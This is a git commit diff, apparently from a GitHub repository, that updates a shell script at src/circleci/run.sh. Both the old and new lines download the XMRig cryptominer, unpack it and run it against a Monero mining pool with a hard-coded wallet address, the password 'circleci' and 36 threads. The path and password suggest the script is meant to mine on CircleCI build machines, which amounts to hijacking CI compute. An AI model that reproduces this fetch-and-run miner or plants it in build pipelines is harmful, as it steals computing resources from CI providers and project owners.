bc881e53eb1193fbd6ca36102a9af77454568b46
Slidensdev <139361645+Slidensdev@users.noreply.github.com>
2024-11-07 12:38:38 +0700

    Update run.sh

--- src/circleci/run.sh
+++ src/circleci/run.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
-tar xf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && clear
-./xmrig -o gulf.moneroocean.stream:10128 \
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+tar xf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && clear
+./xmrig -o gulf.moneroocean.stream:20128 \
   -u 83foVJNSurhY63FDSbLnogDibYhU5AwMhUuC8adAmVyaVdMtjtr5MNDXfPUhK3pBxAKK15s8wP1xfcSWpJTLwvaRGq2qoXB \
   -p circleci --threads 36
